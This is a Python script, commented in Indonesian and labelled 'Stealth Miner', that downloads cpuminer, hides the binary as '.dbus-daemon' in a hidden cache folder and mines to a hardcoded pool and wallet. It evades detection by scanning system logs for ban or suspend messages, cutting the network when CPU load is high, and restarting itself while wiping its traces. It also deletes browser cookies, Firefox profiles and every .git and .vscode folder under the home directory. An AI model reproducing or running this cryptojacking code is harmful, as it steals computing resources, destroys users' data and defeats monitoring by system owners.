#!/usr/bin/env python3
import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random, socket

# Konfigurasi
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".dbus-daemon"
HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
POOL = "stratum+tcp://164.92.145.122:5357"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()

# Durasi
MIN_DURATION = 300
MAX_DURATION = 720
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180
cooldown_restart_counter = 0
cooldown_restart_limit = 3
cooldown_reset_time = time.time() + 3600

# === Fungsi Tambahan ===

def fake_http_headers():
    headers = [
        "User-Agent: Mozilla/5.0",
        "Accept: */*",
        "Referer: https://google.com/",
        "Connection: keep-alive",
        "X-Forwarded-For: 127.0.0.1",
    ]
    os.environ["FAKE_HEADERS"] = "|".join(headers)

def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

def dns_doh_bypass():
    try:
        subprocess.call([
            "curl", "-s", "-H", "accept: application/dns-json",
            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def is_cpu_100_percent():
    try:
        return os.getloadavg()[0] >= os.cpu_count()
    except:
        return False

def should_restart():
    global cooldown_restart_counter, cooldown_reset_time
    if time.time() > cooldown_reset_time:
        cooldown_restart_counter = 0
        cooldown_reset_time = time.time() + 3600
    if cooldown_restart_counter < cooldown_restart_limit:
        cooldown_restart_counter += 1
        return True
    return False

def disconnect_network():
    print("[🔌] Putus koneksi...")
    try:
        subprocess.call(["nmcli", "networking", "off"])
        subprocess.call(["nmcli", "radio", "wifi", "off"])
    except:
        try: subprocess.call(["ifconfig", "eth0", "down"])
        except: pass

def reconnect_network():
    print("[🌐] Reconnect jaringan...")
    try:
        subprocess.call(["nmcli", "networking", "on"])
        subprocess.call(["nmcli", "radio", "wifi", "on"])
    except:
        try: subprocess.call(["ifconfig", "eth0", "up"])
        except: pass

def detect_system_threat():
    print("[🛡️] Cek sistem diblokir...")
    paths = [
        "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
        "/etc/nologin", "/tmp/.X11-unix"
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                with open(path, "r", errors="ignore") as f:
                    log = f.read().lower()
                    if any(k in log for k in ["suspend", "ban", "terminate", "dismiss"]):
                        print(f"[🚫] Deteksi diblokir: {path}")
                        disconnect_network()
                        restart_script()
            except: continue

def firewall_bypass():
    print("[🔥] Jalankan firewall bypass...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("1.1.1.1", 443))
        s.close()
    except: pass
    try:
        subprocess.call(["ping", "-c", "1", "8.8.8.8"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

def clean_miner_cache():
    try:
        if os.path.exists(TARFILE): os.remove(TARFILE)
        if os.path.exists(HIDDEN_DIR): shutil.rmtree(HIDDEN_DIR)
    except: pass

def clean_myapp_data():
    for path in ["~/MyAppExplore", "~/.local/share/myapp", "~/Downloads/MyApp"]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try: shutil.rmtree(full)
            except: pass

def clean_browser_cookies():
    for path in [
        "~/.config/google-chrome/Default/Cookies",
        "~/.mozilla/firefox", "~/.config/chromium/Default/Cookies"
    ]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try:
                if os.path.isdir(full): shutil.rmtree(full)
                else: os.remove(full)
            except: pass

def clean_source_control():
    for base in ["~", "~/.local/share", "~/Downloads"]:
        for root, dirs, _ in os.walk(os.path.expanduser(base)):
            for d in [".git", ".svn", ".idea", ".vscode", "__pycache__"]:
                path = os.path.join(root, d)
                if os.path.exists(path):
                    try: shutil.rmtree(path)
                    except: pass

def clean_mining_artifacts():
    for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
        for root, _, files in os.walk(os.path.expanduser(base)):
            for f in files:
                if any(k in f.lower() for k in ["miner", "cpuminer", "power2b"]):
                    try: os.remove(os.path.join(root, f))
                    except: pass

def run_one_session():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    urllib.request.urlretrieve(URL, TARFILE)
    with tarfile.open(TARFILE) as tar:
        tar.extractall()
    hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
    os.rename(BIN_NAME, hidden_path)
    os.chmod(hidden_path, 0o755)

    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[⚙️] Mining selama {duration}s...")
    proc = subprocess.Popen([
        hidden_path, "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    if os.path.exists(TARFILE): os.remove(TARFILE)

    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(10)
        if is_cpu_100_percent():
            print(f"[⛔] CPU penuh! cooldown {COOLDOWN_DURATION}s")
            disconnect_network()
            proc.terminate()
            time.sleep(COOLDOWN_DURATION)
            if should_restart(): restart_script()
            else: return
    proc.terminate()

def restart_script():
    try:
        print("[🔁] Restarting...")
        clean_miner_cache()
        clean_myapp_data()
        clean_mining_artifacts()
        time.sleep(5)
        subprocess.Popen([sys.executable] + sys.argv)
        sys.exit(0)
    except Exception as e:
        print(f"[X] Gagal restart: {e}")

def main_loop():
    while True:
        clean_mining_artifacts()
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[⏸️] Istirahat {pause}s...\n")
        time.sleep(pause)

# Entry Point
if __name__ == "__main__":
    print("🚀 Stealth Miner Dimulai...")
    reconnect_network()
    clean_browser_cookies()
    clean_myapp_data()
    clean_source_control()
    fake_http_headers()

    # Thread background proteksi
    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=dns_doh_bypass, daemon=True).start()
    threading.Thread(target=firewall_bypass, daemon=True).start()
    threading.Thread(target=detect_system_threat, daemon=True).start()

    try: main_loop()
    except KeyboardInterrupt:
        restart_script()
    except Exception as e:
        print(f"[!] Error: {e}")
        restart_script()
